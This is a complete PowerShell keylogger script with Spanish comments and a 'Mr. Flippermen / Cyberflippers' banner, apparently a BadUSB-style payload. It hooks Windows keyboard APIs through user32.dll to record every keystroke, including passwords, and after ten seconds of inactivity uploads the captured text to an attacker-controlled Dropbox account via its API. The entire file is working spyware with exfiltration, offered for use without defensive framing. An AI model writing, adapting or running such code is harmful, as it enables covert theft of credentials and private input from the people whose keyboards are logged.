<#
########################################################################################################################
#  __  __ _____      ______ _      _____ _____  _____  ______ _____  __  __ ______ _   _ 			      #
# |  \/  |  __ \    |  ____| |    |_   _|  __ \|  __ \|  ____|  __ \|  \/  |  ____| \ | |			      #
# | \  / | |__) |   | |__  | |      | | | |__) | |__) | |__  | |__) | \  / | |__  |  \| |			      #
# | |\/| |  _  /    |  __| | |      | | |  ___/|  ___/|  __| |  _  /| |\/| |  __| |     |			      #
# | |  | | | \ \ _  | |    | |____ _| |_| |    | |    | |____| | \ \| |  | | |____| |\  |			      #
# |_|  |_|_|  \_(_) |_|    |______|_____|_|    |_|    |______|_|  \_\_|  |_|______|_| \_|                             #
#    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____ 			      # 
#   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                        # 
#  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                          # 
#  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                         # 
#  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                        # 
#   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/ 			      # 
 #########################################################################################################################           
#>

# Introduce tu token de acceso a continuación. 

# $db = "" 

# Función para subir datos a Dropbox
function Upload-ToDropbox {
    param (
        [string]$fileContent,
        [string]$fileName,
        [string]$dropboxAccessToken
    )

    $dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"
    $dropboxArgs = @{
        "Authorization" = "Bearer $dropboxAccessToken"
        "Content-Type"  = "application/octet-stream"
        "Dropbox-API-Arg" = (@{
            "path" = "/$fileName"
            "mode" = "add"
            "autorename" = $true
            "mute" = $false
            "strict_conflict" = $false
        } | ConvertTo-Json -Compress)
    }

    try {
        Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $dropboxArgs -Body ([System.Text.Encoding]::UTF8.GetBytes($fileContent))
        Write-Host "Archivo subido correctamente a Dropbox."
    } catch {
        Write-Host "Error al subir el archivo a Dropbox: $_"
    }
}

# Importar definiciones de DLL para entradas de teclado
$API = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru

# Añadir cronómetro para enviar inteligentemente
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)

# Marca para el inicio del archivo y antes de los resultados
$marca = @'
<#
########################################################################################################################
#  __  __ _____      ______ _      _____ _____  _____  ______ _____  __  __ ______ _   _ 			      #
# |  \/  |  __ \    |  ____| |    |_   _|  __ \|  __ \|  ____|  __ \|  \/  |  ____| \ | |			      #
# | \  / | |__) |   | |__  | |      | | | |__) | |__) | |__  | |__) | \  / | |__  |  \| |			      #
# | |\/| |  _  /    |  __| | |      | | |  ___/|  ___/|  __| |  _  /| |\/| |  __| |     |			      #
# | |  | | | \ \ _  | |    | |____ _| |_| |    | |    | |____| | \ \| |  | | |____| |\  |			      #
# |_|  |_|_|  \_(_) |_|    |______|_____|_|    |_|    |______|_|  \_\_|  |_|______|_| \_|                             #
#    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____                         #
#   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                        # 
#  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                          # 
#  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                         # 
#  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                        # 
#   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/ 			      # 
 #########################################################################################################################           
#>
'@

# Archivo de señal para detener el script
$stopSignalFile = "$env:TEMP\stop.txt"

# Iniciar un bucle continuo
While ($true) {
    # Verificar si existe el archivo de señalización para detener el script
    if (Test-Path $stopSignalFile) {
        Write-Host "Archivo de señalización detectado. Deteniendo el script."
        Remove-Item $stopSignalFile -Force
        exit
    }

    $keyPressed = $false
    try {
        # Iniciar un bucle que verifica el tiempo desde la última actividad antes de enviar el mensaje
        while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
            # Iniciar el bucle con un retraso de 30 ms entre cada verificación del estado del teclado
            Start-Sleep -Milliseconds 30
            for ($asc = 8; $asc -le 254; $asc++) {
                # Obtener el estado de la tecla (si alguna tecla está actualmente presionada)
                $keyst = $API::GetAsyncKeyState($asc)
                # Si se presiona una tecla
                if ($keyst -eq -32767) {
                    # Reiniciar el temporizador de inactividad
                    $keyPressed = $true
                    $LastKeypressTime.Restart()
                    $null = [console]::CapsLock
                    # Traducir el código de tecla a una letra
                    $vtkey = $API::MapVirtualKey($asc, 3)
                    # Obtener el estado del teclado y crear un StringBuilder
                    $kbst = New-Object Byte[] 256
                    $checkkbst = $API::GetKeyboardState($kbst)
                    $logchar = New-Object -TypeName System.Text.StringBuilder
                    # Definir la tecla que se presionó          
                    if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                        # Verificar teclas no alfanuméricas
                        $LString = $logchar.ToString()
                        if ($asc -eq 8) {$LString = "[BKSP]"}
                        if ($asc -eq 13) {$LString = "[ENT]"}
                        if ($asc -eq 27) {$LString = "[ESC]"}
                        # Añadir la tecla a la variable de envío
                        $send += $LString 
                    }
                }
            }
        }
    }
    finally {
        if ($keyPressed) {
            # Enviar las teclas guardadas a Dropbox con la marca al inicio
            $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
            $fileName = "keystrokes_$timestamp.txt"
            $fileContent = "$marca`n$send"
            Upload-ToDropbox -fileContent $fileContent -fileName $fileName -dropboxAccessToken $db

            # Limpiar el archivo de registro y reiniciar la verificación de inactividad
            $send = ""
            $keyPressed = $false
        }
    }
    # Reiniciar el cronómetro antes de reiniciar el bucle
    $LastKeypressTime.Restart()
    Start-Sleep -Milliseconds 10
}
